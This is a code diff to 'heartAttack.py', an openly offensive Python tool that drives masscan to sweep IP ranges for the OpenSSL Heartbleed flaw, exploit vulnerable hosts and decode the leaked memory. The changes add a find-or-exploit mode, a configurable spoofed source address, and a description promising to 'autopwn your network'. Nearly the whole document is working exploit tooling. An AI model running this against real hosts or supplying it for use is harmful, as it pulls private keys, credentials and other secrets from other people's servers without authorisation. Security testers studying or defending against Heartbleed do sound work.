@@ -1,23 +1,23 @@
 #!/usr/bin/python
 
 #######################
-# heartAttack.py
+# heartAttack.py -- The Heartbleed point and shoot PoC
 #
-# Lazy utilization of 'Massca'n to quickly find, exploit,
+# Intended for any persons using the interwebs.
+# This is lazy utilization of 'Masscan' to quickly find, exploit,
 # and decode the OpenSSL heartbleed vulnerability quickly.
-# Made for to work and function on Linux, and Mac. Maybe Windows in the future 
+# Made to work and function on Linux only atm. Haven't tested on OSX.
+# Now nobody will question if you have heartbleed :0
 #
-# Check for 'masscan'. If not found it will download it in working directory
-# It will unzip
+# NOTE: If running install the first time yields an error that the 'make file can't be found',
+# 	then just run it againand it should work. Trying to fix this problem atm
 #
 # Mad props to Robert David Graham of 'Masscan' and Jim Hofstee
 #
 # Author: spaceB0x (Tyler Welton)
-# 
-# Mention REQUREMENTS
+# 		github.com/spaceB0x
 ########################
 
-##Test 10.209.1.246
 
 import os
 import urllib
@@ -93,46 +93,67 @@ def decode(string):
 	data=base64.b64decode(string)
 	return data	
 
-def runMS(mode,ips, ports, output):
+def runMS(ips, ports, output,unusedip, mode):
+	m=mode.lower()
 	#mode is 'b' for find hb; or 'a' for exploit heartbleed
-	if (mode=='a'):
+	if (m=='a'):
 		if(os.path.isfile('masscan')=='false'):
 			print "** No file 'masscan' in this directory"
 			return
-		#check for available IP
+		
 		#Run the actual Scan
-		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed --capture heartbleed > %s' %(ports, ips, output))
-	elif(mode=='b'):
+		os.system('./masscan -p %d %s -S %s --rate=500 --heartbleed --capture heartbleed > %s' %(ports, ips,unusedip, output))
+	elif(m=='b'):
 		if(os.path.isfile('masscan')=='false'):
 			print "** No file 'masscan' in this directory"
 			return
-		os.system('./masscan -p %d %s -S 10.209.8.116 --rate=500 --heartbleed > %s' %(ports, ips, output))
+		os.system('./masscan -p %d %s -S %s --rate=500 --heartbleed > %s' %(ports, ips, unusedip, output))
 
-def report(output):
+def report(output,mode):
 	#Get the encoded part extracted
 	t=0
-	f=open(output,"r")
-	whole=f.read()
-	word_list=whole.split(" ")
-	for i in range(len(word_list)):
-		if (word_list[i]=='[heartbleed]'):
-			t=i+1
-			break
-	f.close()
+	m=mode.lower()
+	if (m=='a'):
+		f=open(output,"r")
+		whole=f.read()
+		word_list=whole.split(" ")
+		for i in range(len(word_list)):
+			if (word_list[i]=='[heartbleed]'):
+				t=i+1
+				encoded=word_list[t]
+				decoded=decode(str(word_list[t]))
+				print decoded
+		f.close()
+	elif (m=='b'):
+		f=open(output, "r")
+		for line in f:
+			if(line.find('[vuln]') != -1):
+				print line
 	
-	####Print and get encode and decoded
-	encoded=word_list[t]
-	decoded=decode(str(word_list[t]))
-	print decoded	
+		f.close()
+
 #MAIN====================================================================================================
 def main():
 	#option parser
-	desc=" "
-	parser=optparse.OptionParser("%prog"+ "-i <ip_range> -p <ports> -w <outputfile>", description=desc)	
+	desc=""" HeartAttack will autopwn your network for the infamous heartbleed vulnerability. 
+Just point and shoot. It takes an IP address or a range of IPs and searches for vulnerable
+machines. If found, a vulnerable machine will be exploited and decoded for proof of concept,
+unless otherwise specified by the MODE option. An unused IP address on the vlan MUST be 
+provided in order for the masscan portion to work properlyl. Enjoy taking this to your CIO.
+				Cheers! --spaceB0x
+"""
+	parser=optparse.OptionParser("%prog"+ "-i <ip_range> -p <ports> -w <outputfile>", description=desc)
+	parser.add_option('-m', dest='mode', type='string', help='Mode A finds and exploits heartbleed. Mode B just finds heartbleed. If unspecified, it will default to Mode A.',default='a')	
 	parser.add_option('-i', dest='ips', type='string', help='IP address or range of addresses to scan')
-	parser.add_option('-p', dest='ports', type='int', help='Port(s) if any to scan. Defaults to 443 if none specified')
+	parser.add_option('-p', dest='ports', type='int', help='Port(s) if any to scan. Defaults to 443 if none specified', default=443)
 	parser.add_option('-w', dest='output', type='string', help='File to send output results to')
+	parser.add_option('-u', dest='unusedip', type='string', help="Must supply an IP address from the subnet that isn't being used")
+
 	(options,args)=parser.parse_args()
+	#check for missing options
+	if ((options.ips==None) | (options.output==None) |(options.unusedip==None)):
+		os.system('python heartAttack.py --help')
+		exit(0)
 
 	#os
 	oper= str(os.name) 
@@ -141,11 +162,8 @@ def main():
 	#Do linux/MacOS specific stuff
 	if oper=='posix':
 		setup()
-		runMS(options.ips, options.ports, options.output)
-		report(options.output)
-		# Check for vulnerable hosts
-		# Exploit hosts
-		# Decode Exploit
+		runMS(options.ips, options.ports, options.output, options.unusedip, options.mode)
+		report(options.output,options.mode)
 		# Formalize the report
 		
 	#If windows...break the news
